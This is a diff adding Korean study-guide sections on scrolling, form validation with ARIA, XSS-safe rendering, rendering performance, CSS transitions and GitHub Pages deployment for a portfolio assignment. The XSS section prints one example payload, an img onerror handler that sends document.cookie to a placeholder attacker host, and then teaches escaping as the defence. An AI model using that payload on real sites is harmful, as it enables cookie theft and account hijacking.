@@ -22,7 +22,7 @@
 
 ---
 
-### C-1. 시맨틱 태그와 문서 구조 설계 기준 → R-4~R-13 / E-2.1, E-3.1
+### C-1. 시맨틱 태그와 문서 구조 설계 기준 → R-4~R-13 / E-1.1, E-2.1, E-3.1
 
 **왜 쓰는가 — `div`로만 짜면 무엇이 깨지는가**
 
@@ -227,7 +227,7 @@ grid.innerHTML = repos.map(toCard).join('');
 
 ---
 
-### C-5. fetch · async/await · 에러 처리 → R-48~R-54 / E-3.4
+### C-5. fetch · async/await · 에러 처리 → R-48~R-54 / E-1.4, E-2.4, E-3.4
 
 **Promise** — 지금은 없지만 나중에 생길 값. `pending` → `fulfilled` 또는 `rejected`.
 
@@ -285,7 +285,7 @@ try {
 
 ---
 
-### C-6. 이벤트 → 상태 → 렌더링 (이 과제의 핵심) → R-55 / E-3.5, E-4.4
+### C-6. 이벤트 → 상태 → 렌더링 (이 과제의 핵심) → R-55 / E-2.4, E-3.5, E-4.4
 
 **한 문장**: 사용자가 무언가 하면 → **상태 값**을 바꾸고 → 바뀐 상태를 보고 **화면을 다시 그린다.** 화면을 직접 건드리지 않는다.
 
@@ -343,7 +343,7 @@ const { theme } = getState();
 
 ---
 
-### C-7. CSS 변수 · data-theme · localStorage → R-15, R-16, R-36, R-37 / E-2.3, E-3.6
+### C-7. CSS 변수 · data-theme · localStorage → R-15, R-16, R-36, R-37 / E-1.3, E-2.3, E-3.6
 
 **CSS 변수(사용자 지정 속성)**
 
@@ -509,6 +509,320 @@ document.querySelectorAll('.reveal').forEach((el) => observer.observe(el));
 **✍️ 내가 채울 것**
 - 403과 404를 구분했는가, 어떻게:
 - 캐싱을 넣었다면 TTL과 그 근거:
+
+### C-11. 스크롤 제어와 scroll 이벤트 → R-30, R-33~R-35 / E-1.2
+
+**부드러운 스크롤 두 가지 방법** (R-33)
+
+```css
+html { scroll-behavior: smooth; }     /* ① CSS 한 줄. 앵커 기본 동작에 자동 적용 */
+```
+```js
+target.scrollIntoView({ behavior: 'smooth', block: 'start' });  /* ② JS. 조건부 제어 가능 */
+```
+
+①은 `<a href="#about">`의 기본 동작을 그대로 두고 부드럽게만 만든다. ②는 `preventDefault()`로 기본 이동을 막고 직접 스크롤하는 방식이라, 모바일에서 메뉴를 닫으면서 이동하는 식의 **추가 동작을 끼워 넣을 때** 필요하다.
+
+**⚠️ 고정 헤더가 제목을 덮는 문제** — 앵커로 이동하면 섹션 최상단이 뷰포트 최상단에 붙는데, 그 자리에 고정 헤더가 있으면 제목이 가려진다. `top: -80px` 같은 보정 요소를 넣는 편법이 흔하지만 CSS 한 줄이면 된다.
+
+```css
+section { scroll-margin-top: 80px; }   /* 스크롤 목적지만 80px 아래로 */
+```
+
+**scroll 이벤트** (R-34, R-35 — R-30이 요구하는 `scroll` 이벤트가 여기 쓰인다)
+
+```js
+window.addEventListener('scroll', onScroll, { passive: true });
+```
+
+- `window.scrollY` — 문서 최상단에서 현재까지 스크롤된 픽셀. 이 값을 임계값(300 / 60)과 비교한다
+- **`{ passive: true }`** — "이 핸들러는 `preventDefault()`를 쓰지 않는다"는 약속. 브라우저가 핸들러 실행을 기다리지 않고 스크롤을 먼저 처리해 끊김이 줄어든다
+- 스크롤 이벤트는 **한 번의 스크롤에 수십 번** 발생한다. 매번 DOM을 건드리면 낭비다
+
+```js
+// ✗ 스크롤 내내 매번 classList 조작
+if (window.scrollY > 300) topBtn.classList.add('visible');
+
+// ✓ 상태가 바뀔 때만 조작 — 상태→렌더링 원칙(C-6)과도 일치
+const shouldShow = window.scrollY > 300;
+if (shouldShow !== getState().topVisible) setState({ topVisible: shouldShow });
+```
+
+더 줄여야 하면 `requestAnimationFrame`으로 프레임당 1회로 묶는다(쓰로틀).
+
+**C-9(Intersection Observer)와의 역할 분담** — 헷갈리기 쉬운 지점이다.
+
+| 묻는 것 | 도구 |
+|---|---|
+| "이 요소가 화면에 보이나?" | **Intersection Observer** (R-38 스크롤 애니메이션) |
+| "얼마나 스크롤했나?" (300px / 60px) | **scroll 이벤트** (R-34, R-35) |
+
+IO는 특정 요소와의 교차만 알려줄 뿐 스크롤 양을 주지 않는다. 그래서 이 과제에는 **둘 다** 필요하다.
+
+**접근성**: `@media (prefers-reduced-motion: reduce)`에서는 `scroll-behavior: auto`로 되돌린다. 부드러운 스크롤이 어지럼증을 유발하는 사용자가 있다.
+
+**✍️ 내가 채울 것**
+- 부드러운 스크롤을 ①/② 중 무엇으로 했고 왜:
+- 임계값 300 / 60을 그대로 썼는가, 바꿨다면 근거:
+
+---
+
+### C-12. 폼 검증과 접근성 → R-39~R-43 / E-1.5, E-2.5
+
+**브라우저가 이미 해주는 것 — Constraint Validation API**
+
+```html
+<input type="email" id="email" required />
+```
+
+`required`와 `type="email"`만으로 브라우저가 검증하고 말풍선을 띄운다. JS로도 결과를 읽을 수 있다.
+
+```js
+input.checkValidity();          // true / false
+input.validity.valueMissing;    // 비어 있음
+input.validity.typeMismatch;    // 형식 불일치
+```
+
+**그런데 왜 직접 만드는가** — 기본 말풍선은 **위치·문구·디자인을 제어할 수 없고**, 하나씩 순서대로만 뜬다. R-42는 "에러 메시지가 **입력 필드 근처**에 표시"를 요구하므로 기본 UI로는 충족되지 않는다.
+
+```html
+<form novalidate>   <!-- 기본 말풍선을 끄고 직접 표시한다 -->
+```
+
+`novalidate`를 걸어도 `checkValidity()`는 그대로 쓸 수 있다. **검증 로직은 브라우저 것을 쓰고 표시만 직접** 하는 조합이 제일 적은 코드다.
+
+**이메일 정규식의 한계** (E-3.1 꼬리질문에 자주 나온다)
+
+RFC 5322를 완전히 만족하는 정규식은 사실상 쓸 수 없을 만큼 길다. 실무에서는 **명백한 오타만 걸러내는 수준**으로 충분하다.
+
+```js
+const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+```
+
+**정규식으로는 그 주소가 실제로 존재하는지 알 수 없다.** 진짜 검증은 확인 메일을 보내는 것뿐이다 — 이 한 줄을 말할 수 있으면 이해도가 드러난다.
+
+**검증 시점** (설계 결정 #5)
+
+| 시점 | 동작 |
+|---|---|
+| `submit` | 전체 필드 검증 → 실패하면 `preventDefault()`하고 에러 표시 |
+| `input` | **한 번이라도 제출해 에러가 난 필드만** 다시 검증해 에러를 해제 |
+
+- 처음부터 `input`으로 검증하면 이름 한 글자 쳤을 때 "형식이 올바르지 않습니다"가 떠 공격적이다
+- `submit`만 쓰면 사용자가 고쳐도 에러 메시지가 그대로 남아 고쳐진 건지 알 수 없다
+- 이 "제출 후부터 실시간"을 **touched 패턴**이라 부른다. React Hook Form 등이 쓰는 것과 같은 개념이다
+
+**접근성 — 에러 메시지는 보이기만 해선 안 된다**
+
+```html
+<label for="email">이메일</label>
+<input type="email" id="email" aria-describedby="email-error" aria-invalid="true" />
+<p id="email-error" role="alert">이메일 형식이 올바르지 않습니다.</p>
+```
+
+| 속성 | 역할 |
+|---|---|
+| `aria-describedby` | 입력과 에러 메시지를 **연결**한다. 스크린리더가 입력에 들어갈 때 함께 읽는다 |
+| `aria-invalid` | 이 입력이 현재 유효하지 않음을 알린다 |
+| `role="alert"` | 메시지가 나타나는 **즉시** 읽어준다 |
+
+성공 메시지(R-43)는 `role="status"`가 적절하다 — 급하지 않게 알린다.
+
+**✍️ 내가 채울 것**
+- 브라우저 검증(`checkValidity`)을 썼는가, 직접 정규식을 썼는가, 그 이유:
+- 에러 메시지에 ARIA를 붙였는가:
+
+---
+
+### C-13. XSS와 안전한 렌더링 → 설계 결정 #4 / E-4.2
+
+**무엇이 문제인가**
+
+`innerHTML`은 대입된 문자열을 **HTML로 파싱한다.** 태그가 들어 있으면 태그로 해석된다.
+
+GitHub API의 `name`·`description`은 **사람이 입력한 값**이다. 저장소 설명에 이런 걸 넣을 수 있다.
+
+```
+<img src=x onerror="fetch('https://공격자/steal?c='+document.cookie)">
+```
+
+이 문자열이 그대로 `innerHTML`에 들어가면 **내 사이트에서 그 스크립트가 실행된다.** 이것이 XSS(Cross-Site Scripting)다.
+
+> 참고: `innerHTML`로 삽입된 `<script>` 태그는 실행되지 않는다. 그래서 공격은 주로 **`onerror`·`onload` 같은 이벤트 핸들러 속성**을 통해 들어온다. "script만 막으면 된다"는 오해를 조심한다.
+
+이 과제에서는 내 저장소만 불러오니 당장은 내가 나를 공격하는 꼴이라 피해가 없다. 하지만 **사용자명을 입력받는 기능으로 확장하는 순간 실제 취약점**이 되고, 평가는 그 확장을 묻는다.
+
+**대응 3계층**
+
+| | 방법 | 이 과제에서 |
+|---|---|---|
+| ① | `textContent`로 넣는다 — 태그가 문자로 들어가 가장 안전 | R-45가 템플릿 리터럴을 요구해 전면 적용은 불가 |
+| ② | **삽입 직전 이스케이프** — `& < > " '`를 엔티티로 치환 | **채택** (설계 #4) |
+| ③ | 속성 값도 검사 — `href="javascript:..."` 차단, URL 스킴 확인 | 저장소 링크에 적용 |
+
+```js
+const escapeHtml = (str = '') =>
+  String(str).replace(/[&<>"']/g, (ch) => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
+  }[ch]));
+
+const toCard = ({ name, description, html_url }) => `
+  <article class="card">
+    <h3>${escapeHtml(name)}</h3>
+    <p>${escapeHtml(description ?? '설명 없음')}</p>
+    <a href="${encodeURI(html_url)}">보기</a>
+  </article>`;
+```
+
+**요점**: 문자열을 만들 때가 아니라 **HTML에 넣는 그 지점에서** 이스케이프한다. 데이터는 원본 그대로 두고, 출력 순간에만 무해화하는 것이 원칙이다.
+
+**✍️ 내가 채울 것**
+- 이스케이프를 적용한 필드 목록:
+- 안 한 필드가 있다면 안전하다고 판단한 근거:
+
+---
+
+### C-14. 브라우저 렌더링 파이프라인과 성능 → E-4.1
+
+**화면이 그려지는 순서**
+
+```
+HTML ─파싱→ DOM ┐
+                ├→ 렌더 트리 → 레이아웃(Layout) → 페인트(Paint) → 합성(Composite)
+CSS  ─파싱→ CSSOM┘              "어디에 얼마나"      "무슨 색"      "겹쳐 올리기"
+```
+
+- **레이아웃(= 리플로우)** — 위치와 크기를 계산한다. **가장 비싸다.** 한 요소가 바뀌면 주변도 다시 계산될 수 있다
+- **페인트** — 픽셀을 칠한다. `box-shadow`, `border-radius`가 여기 비용을 더한다
+- **합성** — 이미 칠해진 레이어를 GPU가 배치한다. **가장 싸다**
+
+**리플로우를 유발하는 것**
+
+- 쓰기: `width`, `height`, `top`, `margin`, `display` 변경, DOM 추가/삭제
+- **읽기**: `getBoundingClientRect()`, `offsetTop`, `scrollHeight` — 정확한 값을 위해 브라우저가 밀린 레이아웃을 **즉시** 계산한다(강제 동기 레이아웃). C-9에서 scroll 이벤트가 위험한 이유가 이것이다
+
+**저장소 100개일 때의 병목** (E-4.1의 답)
+
+| 문제 | 왜 | 개선 |
+|---|---|---|
+| 반복 `innerHTML +=` | 대입할 때마다 **전체를 다시 파싱하고 레이아웃**한다. 100번이면 100번 | `map(...).join('')`으로 문자열을 다 만든 뒤 **한 번만** 대입 ← 우리 설계가 이미 이렇다 |
+| 노드를 하나씩 `appendChild` | 붙일 때마다 레이아웃 | `DocumentFragment`에 모아 한 번에 붙인다 |
+| 이미지 100장 동시 요청 | 네트워크·메모리 | `<img loading="lazy">` |
+| 100개를 전부 DOM에 유지 | 노드 수 자체가 비용 | 페이지네이션 / "더 보기" / 가상 스크롤 |
+
+**애니메이션은 `transform`·`opacity`로** — 이 둘은 레이아웃과 페인트를 건너뛰고 합성만 한다. `top`이나 `width`를 애니메이션하면 매 프레임 레이아웃이 돈다. (→ C-15)
+
+**측정**: DevTools Performance 탭에서 기록하면 Layout·Paint 구간이 보인다. 추측으로 최적화하지 않는다.
+
+**✍️ 내가 채울 것**
+- 내 렌더링 방식과 100개일 때 먼저 손볼 지점:
+
+---
+
+### C-15. transition과 시각 효과의 비용 → R-22, R-23
+
+**`transition` 문법**
+
+```css
+.card {
+  transition: transform 200ms ease-out, box-shadow 200ms ease-out;
+}
+.card:hover { transform: translateY(-4px); }
+```
+
+`속성 지속시간 타이밍함수 [지연]` 순서. 쉼표로 여러 개를 나열한다.
+
+**⚠️ `transition: all`을 쓰지 않는다**
+
+- 지금은 문제없어도 나중에 추가한 속성까지 **의도치 않게 애니메이션된다**
+- 브라우저가 모든 속성을 감시해야 해 비용을 예측할 수 없다
+- 애니메이션할 속성을 **명시하는 것 자체가 설계 의도의 표현**이다
+
+**무엇을 애니메이션할 것인가** (C-14와 직결)
+
+| 등급 | 속성 | 비용 |
+|---|---|---|
+| 좋음 | `transform`, `opacity` | 합성만. 60fps 유지 쉬움 |
+| 보통 | `background-color`, `box-shadow`, `color` | 페인트 발생 |
+| 피함 | `width`, `height`, `top`, `left`, `margin` | **레이아웃부터 다시** |
+
+카드 hover는 `translateY` + `box-shadow` 조합이 전형적이다. `margin-top`으로 띄우면 주변 레이아웃이 통째로 밀린다.
+
+**hover는 포인터 기기에만**
+
+```css
+@media (hover: hover) {
+  .card:hover { transform: translateY(-4px); }
+}
+```
+
+터치 기기에서는 탭한 뒤 hover 상태가 **눌린 채로 남는다.** 이 쿼리로 감싸면 그 문제가 없다.
+
+**`box-shadow`** (R-23) — 깊이감을 주지만 페인트 비용이 있다. 그림자를 크게 흐리게(`blur`) 줄수록 비싸다. 여러 요소에 큰 그림자를 깔고 스크롤하면 체감된다.
+
+**모션 민감성**
+
+```css
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { transition-duration: 0.01ms !important; animation: none !important; }
+}
+```
+
+**✍️ 내가 채울 것**
+- 내가 애니메이션한 속성 목록:
+- `transition: all`을 쓰지 않은 대신 명시한 속성:
+
+---
+
+### C-16. 정적 사이트 구조와 배포 → R-1~R-3, R-14, R-56~R-58 / E-1.6, E-2.1
+
+**왜 HTML·CSS·JS를 파일로 나누는가** (R-1, R-2, R-14)
+
+1. **관심사 분리** — 구조(HTML) / 표현(CSS) / 동작(JS). 고칠 곳을 찾는 시간이 줄어든다
+2. **캐싱** — 브라우저는 파일 단위로 캐시한다. HTML만 바뀌었을 때 CSS·JS를 다시 받지 않는다. 한 파일에 몰아넣으면 한 글자만 고쳐도 전부 다시 받는다
+3. **재사용** — 페이지가 늘어나면 같은 스타일시트를 공유한다
+
+**`<link>`는 `<head>`, `<script>`는 `defer`**
+
+- 스타일시트는 렌더링을 차단한다. 그게 **의도된 동작**이다 — 스타일 없는 화면이 먼저 보였다가 바뀌는 깜빡임(FOUC)을 막는다
+- 스크립트는 반대로 차단하면 안 된다. `defer`로 파싱 후 실행 (→ C-3)
+
+**Live Server가 필요한 진짜 이유** (R-3)
+
+단순히 자동 새로고침 때문이 아니다. `file://`로 HTML을 직접 열면:
+
+- `fetch`가 **CORS 정책에 막힌다** → GitHub API 호출(R-48)이 실패한다
+- ES 모듈(`type="module"`)이 **로드되지 않는다** → 설계 결정 #1의 파일 분할이 동작하지 않는다
+
+즉 이 과제는 **로컬 HTTP 서버 없이는 개발 자체가 불가능**하다.
+
+**GitHub Pages**
+
+- 빌드 과정 없이 **브랜치의 정적 파일을 그대로 서빙**한다. 소스는 `브랜치 + 경로`(루트 또는 `/docs`)로 지정한다
+- 무료 계정은 **public 저장소**여야 한다
+- push하면 자동 배포되지만 **반영까지 수십 초~수 분** 걸린다
+
+**⚠️ 프로젝트 사이트는 하위 경로다**
+
+```
+https://codewhite7777.github.io/codyssey-b1-portfolio/
+                                └─ 저장소 이름이 경로에 붙는다
+```
+
+| 경로 표기 | 로컬(Live Server) | 배포 |
+|---|---|---|
+| `href="/css/style.css"` | ✅ 동작 | ❌ **404** — 도메인 루트를 가리켜 저장소 경로를 벗어난다 |
+| `href="css/style.css"` | ✅ | ✅ |
+
+**모든 자산은 상대경로로 쓴다.** 로컬에서는 멀쩡하고 배포에서만 깨지는 유형이라 마감 직전에 발견되기 쉽다.
+
+**캐시** — Pages는 CDN을 거친다. 배포했는데 예전 화면이 보이면 강력 새로고침(⌘⇧R)으로 먼저 확인한다.
+
+**README** (R-58) — 평가자가 가장 먼저 보는 문서다. 설명·사용 기술·배포 URL·스크린샷에 더해 **임계값 3개(300px / 60px / 0.2)를 반드시 명시**한다. 원문이 "자유 변경 가능하나 README에 명시"라고 조건을 걸었기 때문에, 기본값을 썼더라도 적지 않으면 항목 누락이다.
+
+**✍️ 내가 채울 것**
+- 절대경로를 쓴 곳이 있는지 점검한 결과:
+- README에 적은 임계값 3개:
 
 ---
 
